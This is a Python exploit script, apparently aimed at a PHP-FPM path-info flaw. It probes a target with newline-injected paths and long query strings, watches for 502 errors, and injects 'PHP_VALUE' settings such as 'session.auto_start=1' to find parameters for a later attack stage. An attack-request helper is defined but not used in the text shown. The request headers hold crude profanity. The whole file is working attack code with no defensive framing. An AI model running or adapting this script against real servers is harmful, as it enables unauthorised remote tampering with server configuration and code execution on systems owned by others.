import requests

PosOffset = 34
MinQSL = 1500
MaxQSL = 1950
CommonQSLDelta = 2
PHPOptionEnable = "session.auto_start=1"
PHPOptionDisable = "session.auto_start=0"

def makeup_payload(payload,PosOffset):
    if len(payload) > PosOffset:
        print("payload is too long :%s " % payload)
        exit(0)
    payload = payload + (PosOffset-len(payload))*";"
    return payload

def DoRequestAttack(url,PisosLength):
    headers = {
        "User-Agent":"Mozilla/5.0",
        "D-Pisos":"8"+"="*PisosLength+"D",
        "Ebut":"mamku tvoyu",
    }
    try:
        res = requests.get(url,headers=headers)
        response_headers = dict(res.headers)

        if res.status_code == 200:
            return res.status_code,res.text
        else:
            return res.status_code,res.text
    except Exception as err:
        print("err in NewRequestWithContext:",err)
        return res.status_code,"Error:"+err

def DoRequestDetect(pathInfo,url,QueryStringLength,qslDelta,PisosLength):
    url = url+pathInfo+"?"+"Q"*(QueryStringLength - qslDelta//2 )
    
    headers = {
        "User-Agent":"Mozilla/5.0",
        "D-Pisos":"8"+"="*PisosLength+"D",
        "Ebut":"mamku tvoyu",
    }
    try:
        res = requests.get(url,headers=headers)
        response_headers = dict(res.headers)
        if "Set-Cookie" in response_headers.keys():
            cookie = response_headers["Set-Cookie"]
            return res.status_code,cookie
        else:
            return res.status_code,res.text
    except Exception as err:
        print("err in NewRequestWithContext:",err)
        return res.status_code,"Error Flag:"+err

def detect(url):
    ##### Make a test ########################
    status, _ = DoRequestDetect("/path\ninfo.php",url,MinQSL,CommonQSLDelta,1)
    print("Base status code is %d" % status)
    if status != 200:
        print("Connection Failed!")
        exit(0)
    
    ##### Find status 502 as candidates ########################
    qsl_candidate = []
    for qsl in range(MinQSL,MaxQSL,5):
        status,_ = DoRequestDetect("/PHP\nis_the_shittiest_lang.php",url,qsl,CommonQSLDelta,1)
        if status == 200:
            continue
        else:
            print("qsl:%d with status code 502" % qsl)
            qsl_candidate.append(qsl)

    if len(qsl_candidate) == 0:
        print("no candidate found, invulnerable or something wrong")
        exit(0)
    if len(qsl_candidate) > 10:
        print("Too much candidates, Banned!")
        exit(0)

    qsl_candidate_extend = []
    for qsl in qsl_candidate:
        qsl_extend = [qsl-10,qsl-5,qsl]
        qsl_candidate_extend.extend(qsl_extend)
    qsls = list(set(qsl_candidate_extend))
    qsls.sort()
    print("The target maybe vulnerable, extended candidates is %s" % qsls)

    ##### Set session.auto_start=1 and find PisosLength (length of cookie[D-Pisos])  ########################
    EnablePayload = makeup_payload("/PHP_VALUE\n"+PHPOptionEnable,PosOffset)
    
    attack_flag = False
    for QueryStringLength in qsls:
        for PisosLength in range(1,256):
            _, set_cookie = DoRequestDetect(EnablePayload,url,QueryStringLength,CommonQSLDelta,PisosLength)
            # print(QueryStringLength,PisosLength,_)
            if "PHPSESSID" in set_cookie:
                print("Attack params found: --qsl %d --pisos %d --skip-detect" % (QueryStringLength,PisosLength))
                attack_flag = True
                break
        if attack_flag:
            break
    if not attack_flag:
        print("Candidates seems not good!")
        exit(0)

    ##### Set session.auto_start=0
    print("Trying to set \"session.auto_start=0\"")
    for i in range(10):
        DisablePayload = makeup_payload("/PHP_VALUE\n"+PHPOptionDisable,PosOffset)
        _, error = DoRequestDetect(DisablePayload,url,QueryStringLength,CommonQSLDelta,PisosLength)
        if "Error Flag" in error:
            print("Detect() found QueryStringLength only!")
            exit(0)

    return QueryStringLength, PisosLength









